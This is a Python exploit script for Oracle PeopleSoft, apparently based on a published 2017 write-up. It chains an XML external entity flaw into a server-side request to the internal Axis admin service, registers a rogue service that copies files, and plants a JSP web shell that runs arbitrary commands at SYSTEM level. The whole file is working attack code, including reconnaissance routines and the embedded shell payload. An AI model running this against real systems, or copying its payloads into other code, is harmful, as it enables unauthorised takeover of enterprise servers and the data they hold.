#!/usr/bin/python3
# Oracle PeopleSoft SYSTEM RCE
# https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce
# cf
# 2017-05-17
 
import requests
import urllib.parse
import re
import string
import random
import sys
 
 
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
try:
    import colorama
except ImportError:
    colorama = None
else:
    colorama.init()
 
    COLORS = {
        '+': colorama.Fore.GREEN,
        '-': colorama.Fore.RED,
        ':': colorama.Fore.BLUE,
        '!': colorama.Fore.YELLOW
    }
 
 
URL = sys.argv[1].rstrip('/')
CLASS_NAME = 'org.apache.pluto.portalImpl.Deploy'
PROXY = 'localhost:8080'
 
# shell.jsp?c=whoami
PAYLOAD = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis 
= new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>'
 
 
class Browser:
    """Wrapper around requests.
    """
 
    def __init__(self, url):
        self.url = url
        self.init()
 
    def init(self):
        self.session = requests.Session()
        self.session.proxies = {
            'http': PROXY,
            'https': PROXY
        }
        self.session.verify = False
 
    def get(self, url ,*args, **kwargs):
        return self.session.get(url=self.url + url, *args, **kwargs)
 
    def post(self, url, *args, **kwargs):
        return self.session.post(url=self.url + url, *args, **kwargs)
 
    def matches(self, r, regex):
        return re.findall(regex, r.text)
 
 
class Recon(Browser):
    """Grabs different informations about the target.
    """
 
    def check_all(self):
        self.site_id = None
        self.local_port = None
        self.check_version()
        self.check_site_id()
        self.check_local_infos()
 
    def check_version(self):
        """Grabs PeopleTools' version.
        """
        self.version = None
        r = self.get('/PSEMHUB/hub')
        m = self.matches(r, 'Registered Hosts Summary - ([0-9\.]+).</b>')
 
        if m:
            self.version = m[0]
            o(':', 'PTools version: %s' % self.version)
        else:
            o('-', 'Unable to find version')
 
    def check_site_id(self):
        """Grabs the site ID and the local port.
        """
        if self.site_id:
            return
 
        r = self.get('/')
        m = self.matches(r, '/([^/]+)/signon.html')
 
        if not m:
            raise RuntimeError('Unable to find site ID')
 
        self.site_id = m[0]
        o('+', 'Site ID: ' + self.site_id)
 
    def check_local_infos(self):
        """Uses cookies to leak hostname and local port.
        """
        if self.local_port:
            return
 
        r = self.get('/psp/%s/signon.html' % self.site_id)
 
        for c, v in self.session.cookies.items():
            if c.endswith('-PORTAL-PSJSESSIONID'):
                self.local_host, self.local_port, *_ = c.split('-')
                o('+', 'Target: %s:%s' % (self.local_host, self.local_port))
                return
 
        raise RuntimeError('Unable to get local hostname / port')
 
 
class AxisDeploy(Recon):
    """Uses the XXE to install Deploy, and uses its two useful methods to get
    a shell.
    """
 
    def init(self):
        super().init()
        self.service_name = 'YZWXOUuHhildsVmHwIKdZbDCNmRHznXR' #self.random_string(10)
 
    def random_string(self, size):
        return ''.join(random.choice(string.ascii_letters) for _ in range(size))
 
    def url_service(self, payload):
        return 'http://localhost:%s/pspc/services/AdminService?method=%s' % (
            self.local_port,
            urllib.parse.quote_plus(self.psoap(payload))
        )
 
    def war_path(self, name):
        # This is just a guess from the few PeopleSoft instances we audited.
        # It might be wrong.
        suffix = '.war' if self.version and self.version >= '8.50' else ''
        return './applications/peoplesoft/%s%s' % (name, suffix)
 
    def pxml(self, payload):
        """Converts an XML payload into a one-liner.
        """
        payload = payload.strip().replace('\n', ' ')
        payload = re.sub('\s+<', '<', payload, flags=re.S)
        payload = re.sub('\s+', ' ', payload, flags=re.S)
        return payload
 
    def psoap(self, payload):
        """Converts a SOAP payload into a one-liner, including the comment trick
        to allow attributes.
        """
        payload = self.pxml(payload)
        payload = '!-->%s' % payload[:-1]
        return payload
 
    def soap_service_deploy(self):
        """SOAP payload to deploy the service.
        """
        return """
        <ns1:deployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
            <ns1:service name="%s" provider="java:RPC">
                <ns1:parameter name="className" value="%s"/>
                <ns1:parameter name="allowedMethods" value="*"/>
            </ns1:service>
        </ns1:deployment>
        """ % (self.service_name, CLASS_NAME)
 
    def soap_service_undeploy(self):
        """SOAP payload to undeploy the service.
        """
        return """
        <ns1:undeployment xmlns="http://xml.apache.org/axis/wsdd/"
        xmlns:ns1="http://xml.apache.org/axis/wsdd/">
        <ns1:service name="%s"/>
        </ns1:undeployment>
        """ % (self.service_name, )
 
    def xxe_ssrf(self, payload):
        """Runs the given AXIS deploy/undeploy payload through the XXE.
        """
        data = """
        <?xml version="1.0"?>
        <!DOCTYPE IBRequest [
        <!ENTITY x SYSTEM "%s">
        ]>
        <IBRequest>
           <ExternalOperationName>&x;</ExternalOperationName>
           <OperationType/>
           <From><RequestingNode/>
              <Password/>
              <OrigUser/>
              <OrigNode/>
              <OrigProcess/>
              <OrigTimeStamp/>
           </From>
           <To>
              <FinalDestination/>
              <DestinationNode/>
              <SubChannel/>
           </To>
           <ContentSections>
              <ContentSection>
                 <NonRepudiation/>
                 <MessageVersion/>
                 <Data>
                 </Data>
              </ContentSection>
           </ContentSections>
        </IBRequest>
        """ % self.url_service(payload)
        r = self.post(
            '/PSIGW/HttpListeningConnector',
            data=self.pxml(data),
            headers={
                'Content-Type': 'application/xml'
            }
        )
 
    def service_check(self):
        """Verifies that the service is correctly installed.
        """
        r = self.get('/pspc/services')
        return self.service_name in r.text
 
    def service_deploy(self):
        self.xxe_ssrf(self.soap_service_deploy())
 
        if not self.service_check():
            raise RuntimeError('Unable to deploy service')
 
        o('+', 'Service deployed')
 
    def service_undeploy(self):
        if not self.local_port:
            return
 
        self.xxe_ssrf(self.soap_service_undeploy())
 
        if self.service_check():
            o('-', 'Unable to undeploy service')
            return
 
        o('+', 'Service undeployed')
 
    def service_send(self, data):
        """Send data to the Axis endpoint.
        """
        return self.post(
            '/pspc/services/%s' % self.service_name,
            data=data,
            headers={
                'SOAPAction': 'useless',
                'Content-Type': 'application/xml'
            }
        )
 
    def service_copy(self, path0, path1):
        """Copies one file to another.
        """
        data = """
        <?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:copy
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <in0 xsi:type="xsd:string">%s</in0>
            <in1 xsi:type="xsd:string">%s</in1>
        </api:copy>
        </soapenv:Body>
        </soapenv:Envelope>
        """.strip() % (path0, path1)
        response = self.service_send(data)
        return '<ns1:copyResponse' in response.text
 
    def service_main(self, tmp_path, tmp_dir):
        """Writes the payload at the end of the .xml file.
        """
        data = """
        <?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:main
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <api:in0>
                <item xsi:type="xsd:string">%s</item>
                <item xsi:type="xsd:string">%s</item>
                <item xsi:type="xsd:string">%s.war</item>
                <item xsi:type="xsd:string">something</item>
                <item xsi:type="xsd:string">-addToEntityReg</item>
                <item xsi:type="xsd:string"><![CDATA[%s]]></item>
            </api:in0>
        </api:main>
        </soapenv:Body>
        </soapenv:Envelope>
        """.strip() % (tmp_path, tmp_dir, tmp_dir, PAYLOAD)
        response = self.service_send(data)
 
    def build_shell(self):
        """Builds a SYSTEM shell.
        """
        # On versions >= 8.50, using another extension than JSP got 70 bytes
        # in return every time, for some reason.
        # Using .jsp seems to trigger caching, thus the same pivot cannot be
        # used to extract several files.
        # Again, this is just from experience, nothing confirmed
        pivot = '/%s.jsp' % self.random_string(20)
        pivot_path = self.war_path('PSOL') + pivot
        pivot_url = '/PSOL' + pivot
 
        # 1: Copy portletentityregistry.xml to TMP
 
        per = '/WEB-INF/data/portletentityregistry.xml'
        per_path = self.war_path('pspc')
        tmp_path = '../' * 20 + 'TEMP'
        tmp_dir = self.random_string(20)
        tmp_per = tmp_path + '/' + tmp_dir + per
 
        if not self.service_copy(per_path + per, tmp_per):
            raise RuntimeError('Unable to copy original XML file')
 
        # 2: Add JSP payload
        self.service_main(tmp_path, tmp_dir)
 
        # 3: Copy XML to JSP in webroot
        if not self.service_copy(tmp_per, pivot_path):
            raise RuntimeError('Unable to copy modified XML file')
 
        response = self.get(pivot_url)
 
        if response.status_code != 200:
            raise RuntimeError('Unable to access JSP shell')
 
        o('+', 'Shell URL: ' + self.url + pivot_url)
 
 
class PeopleSoftRCE(AxisDeploy):
    def __init__(self, url):
        super().__init__(url)
 
 
def o(s, message):
    if colorama:
        c = COLORS[s]
        s = colorama.Style.BRIGHT + COLORS[s] + '|' + colorama.Style.RESET_ALL
    print('%s %s' % (s, message))
 
 
x = PeopleSoftRCE(URL)
 
try:
    x.check_all()
    x.service_deploy()
    x.build_shell()
except RuntimeError as e:
    o('-', e)
finally:
    x.service_undeploy()
